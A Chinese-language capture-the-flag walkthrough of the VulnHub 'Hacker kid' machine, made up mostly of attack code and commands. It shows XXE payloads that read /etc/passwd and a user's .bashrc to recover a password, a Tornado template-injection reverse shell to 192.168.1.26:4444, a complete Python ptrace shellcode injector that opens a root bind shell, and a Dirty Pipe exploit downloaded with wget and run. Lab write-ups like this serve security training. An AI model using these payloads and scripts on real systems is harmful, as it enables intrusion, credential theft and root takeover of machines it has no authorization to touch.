靶机地址：[Hacker kid: 1.0.1 ~ VulnHub](https://www.vulnhub.com/entry/hacker-kid-101,719/)
主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- 192.168.1.35
sudo nmap -p53,80,9999 -sV 192.168.1.35
# 53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
# 80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
# 9999/tcp open  http    Tornado httpd 6.1
```
可以看到53端口是域名服务，通常TCP53和UDP53是同时开放的，TCP53用于服务期间同步，UDP53接收域名查询。
```Shell
# -sU参数 UDP扫描
sudo nmap -p53 -sU -sV 192.168.1.35
# 53/udp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
```
对这个DNS服务版本进行搜索，没有找到合适的利用代码。
先访问下web服务看看。80端口手动查看能发现如下路径
```
/index.php
/app.html
/form.html
```
简单试了下，暂时没有发现可以利用的地方
9999端口是一个登录页面。
回到80端口的首页上，有提示：`dig` 。和域名有关，寻找相关信息。
可以在源码中看到这样一段注释：`TO DO: Use a GET parameter page_no to view pages.`
手动访问 `http://192.168.1.35/?page_no=1` ，页面上出现一行提示：Oh Man !! Isn't is right to go a little deep inside?
尝试对这个参数进行暴力破解，`http://192.168.1.35/?page_no=21` 多了一些返回内容。
其中最关键的是：`hackers.blackhat.local`
DNS区域传输，用的就是TCP53端口
```Shell
dig axfr @192.168.1.35 blackhat.local | grep -v ";" | sort -k 1,1 | sort -k 4,4 | uniq | grep -w "blackhat.local"
# hackerkid.blackhat.local
# hackers.blackhat.local
# blackhat.local
```
编辑 `hosts` 文件
```Shell
sudo vim /etc/hosts
```
加入如下内容
```
# blackhat.local
192.168.1.35    hackerkid.blackhat.local
192.168.1.35    hackers.blackhat.local
192.168.1.35    blackhat.local
```
发现 `hackerkid.blackhat.local` 是一个注册页面，尝试发送请求，失败了，提示邮箱格式不正确，使用BurpSuite拦截请求看看。发现请求的内容是XML格式，尝试XXE。
尝试如下Payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY bar SYSTEM 'file:///etc/passwd'>]>
<root>
	<name>abc</name>
	<tel>123</tel>
	<email>&bar;</email>
	<password>123</password>
</root>
```
确实存在XXE漏洞，可能可以利用的用户包括
```
root:x:0:0:root:/root:/bin/bash
saket:x:1000:1000:Ubuntu,,,:/home/saket:/bin/bash
```
结合PHP包装器，使用如下Payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY bar SYSTEM 'php://filter/convert.base64-encode/resource=/home/saket/.bashrc'>]>
<root>
	<name>abc</name>
	<tel>123</tel>
	<email>&bar;</email>
	<password>123</password>
</root>
```
经过解码后发现包含如下内容
```
#Setting Password for running python app
username="admin"
password="Saket!#$%@!!"
```
尝试在9999端口的web应用登录，试了一下发现失败了
再尝试一下用户名不用 `admin` 而是 `saket` ，这下成功了
提示告诉名字，访问 `http://192.168.1.35:9999/?name=abc` 试试
果然有问题，再结合之前收集到的信息：`python` 和 `Tornado`
尝试模板注入，Payload如下
```
{{1+ccccdddd}}${1+ccccdddd}<%1+ccccdddd%>[ccccdddd]
```
出现了报错，说明可能存在模板注入，而程序语言是Python，尝试针对Python的PoC
```
${4*4},{{4*4}}
```
这下知道了模板的格式，无返回值的语句用 `{% %}` ，有返回值的用 `{{ }}`
```
{{ 3+3 }}
{% import os %}{{ os.popen('which nc').read() }}
```
但是直接执行会失败，需要先进行URL encode，可以直接用 [CyberChef](https://gchq.github.io/CyberChef/) 的 `URL Encode` 模块，选中 `Encode all special chars`
```
%7B%25%20import%20os%20%25%7D%7B%7B%20os%2Epopen%28%27which%20nc%27%29%2Eread%28%29%20%7D%7D
```
反弹Shell
```
{% import os %}{{ os.system('bash -c "bash -i >& /dev/tcp/192.168.1.26/4444 0>&1"') }}
```
编码后为
```
%7B%25%20import%20os%20%25%7D%7B%7B%20os%2Esystem%28%27bash%20%2Dc%20%22bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E1%2E26%2F4444%200%3E%261%22%27%29%20%7D%7D
```
成功获取到反弹shell
接下来需要去提权
查看特权程序
```Shell
/sbin/getcap -r / 2>/dev/null
# /usr/bin/python2.7 = cap_sys_ptrace+ep
```
python cap_sys_ptrace+ep利用代码
`inject.py`
```python
# 需要libc.so.6
# 默认端口 5600 如果要改需要重新生成shellcode
import ctypes
import sys
import struct

PTRACE_POKETEXT   = 4
PTRACE_GETREGS    = 12
PTRACE_SETREGS    = 13
PTRACE_ATTACH     = 16
PTRACE_DETACH     = 17

class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")

pid=int(sys.argv[1])

libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))

print("Instruction Pointer: " + hex(registers.rip))

print("Injecting Shellcode at: " + hex(registers.rip))

shellcode="\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

for i in xrange(0,len(shellcode),4):

  shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
  shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
  shellcode_byte=int(shellcode_byte_little_endian,16)

  libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

registers.rip=registers.rip+2

libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))

print("Final Instruction Pointer: " + hex(registers.rip))

libc.ptrace(PTRACE_DETACH, pid, None, None)
```
还需要将 `libc.so.6` 复制到目标机器，或者找到相关目录，或者直接修改代码中lib的路径
```Shell
find / -name libc.so.6 2>/dev/null
```
找一个可利用的root用户的进程
```Shell
ps -U root
# 743 ?        00:00:00 apache2
```
执行利用代码
```Shell
/usr/bin/python2.7 inject.py 743
```
默认使用5600端口，查看是否注入成功
```Shell
netstat -tunlpa | grep 5600
ss -pantu | grep 5600
```
连接即可
```Shell
nc 192.168.1.35 5600
```
成功获取到权限

再试试别的方式提权
[[20 CVE#CVE-2022-0847|CVE-2022-0847]]
目标机器上没有安装 `gcc` ，需要现在自己的机器上编译可执行文件
```Shell
gcc exploit.c -o exploit
python3 -m http.server 7331
```
靶机上下载执行
```Shell
wget http://192.168.1.26:7331/exploit
chmod +x exploit
./exploit
# ./exploit: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33' not found (required by ./exploit)
```
提示库文件版本不一致无法执行
查看一下可执行文件的信息
```Shell
ldd exploit
# linux-vdso.so.1 (0x00007ffe61bf3000)
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcf3a7b1000)
# /lib64/ld-linux-x86-64.so.2 (0x00007fcf3a9ac000)
```
先在主机上手动给ELF文件打补丁，指定库文件位置
```Shell
cp /lib/x86_64-linux-gnu/libc.so.6 /tmp/
cp /lib64/ld-linux-x86-64.so.2 /tmp/
patchelf --replace-needed libc.so.6 /tmp/libc.so.6 ./exploit
patchelf --set-interpreter /tmp/ld-linux-x86-64.so.2 ./exploit
```
再将库文件一并传到靶机上
```Shell
cd /tmp
python3 -m http.server 7331
```
靶机上下载，放到同样的位置
```Shell
cd /tmp
wget http://192.168.1.26:7331/libc.so.6
wget http://192.168.1.26:7331/ld-linux-x86-64.so.2
chmod 777 ld-linux-x86-64.so.2 libc.so.6
```
重新传可执行文件再执行
```Shell
wget http://192.168.1.26:7331/exploit
chmod +x exploit
./exploit
```
提权成功
